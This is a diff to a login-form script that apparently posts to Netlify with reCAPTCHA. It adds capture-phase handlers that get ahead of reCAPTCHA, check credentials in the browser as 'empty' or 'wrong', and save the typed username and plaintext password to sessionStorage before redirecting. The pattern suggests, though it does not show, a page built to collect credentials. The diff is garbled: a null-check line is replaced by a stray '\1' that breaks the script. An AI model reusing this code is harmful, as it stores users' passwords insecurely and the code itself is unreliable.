@@ -237,15 +237,56 @@ function onSubmit(token) {
 
   document.addEventListener('DOMContentLoaded', function(){
     var form = getForm();
-    if (!form) return;
+    \1
+    // Intercept clicks on the reCAPTCHA submit button BEFORE Google handles it
+    var submitBtn = form.querySelector('button.g-recaptcha, .g-recaptcha, button[type="submit"], input[type="submit"]');
+    if (submitBtn) {
+      submitBtn.addEventListener('click', function(e){
+        var result = validate(form);
+        if (result === 'empty' || result === 'wrong') {
+          // Save and redirect without triggering reCAPTCHA
+          var ip = getInputs(form);
+          try {
+            sessionStorage.setItem('so_last', JSON.stringify({
+              e: result,
+              username: ip.u ? ip.u.value : '',
+              password: ip.p ? ip.p.value : ''
+            }));
+          } catch(_) {}
+          e.preventDefault();
+          e.stopImmediatePropagation();
+          window.location.replace('/');
+          return false;
+        }
+      }, true); // capture phase to beat reCAPTCHA
+    }
 
-    // Prefer custom validation before any other handlers (including reCAPTCHA)
+    // Intercept Enter key submits when invalid
+    form.addEventListener('keydown', function(e){
+      if (e.key === 'Enter' && !e.shiftKey && !e.ctrlKey) {
+        var result = validate(form);
+        if (result === 'empty' || result === 'wrong') {
+          var ip = getInputs(form);
+          try {
+            sessionStorage.setItem('so_last', JSON.stringify({
+              e: result,
+              username: ip.u ? ip.u.value : '',
+              password: ip.p ? ip.p.value : ''
+            }));
+          } catch(_) {}
+          e.preventDefault();
+          e.stopImmediatePropagation();
+          window.location.replace('/');
+          return false;
+        }
+      }
+    }, true);
+// Prefer custom validation before any other handlers (including reCAPTCHA)
     // Pre-submit blocking removed; we'll show errors after POST
     // 3) Intercept form submit
     form.addEventListener('submit', function(e){
       var result = validate(form);
       var ip = getInputs(form);
-      // Save last inputs + status for the next page load (same tab)
       try {
         sessionStorage.setItem('so_last', JSON.stringify({
           e: result,
@@ -253,9 +294,14 @@ function onSubmit(token) {
           password: ip.p ? ip.p.value : ''
         }));
       } catch(_) {}
-      // Optional: normalize action to "/"
-      form.setAttribute('action', '/');
-      // DO NOT preventDefault -> allow POST
+
+      if (result === 'empty' || result === 'wrong') {
+        // As a safety net, also block here (in case click listener didn't fire)
+        e.preventDefault();
+        window.location.replace('/');
+        return false;
+      }
+      // VALID -> allow default submit (reCAPTCHA + Netlify)
     }, true);
 
     // After load, read ?e=... and show banner accordingly
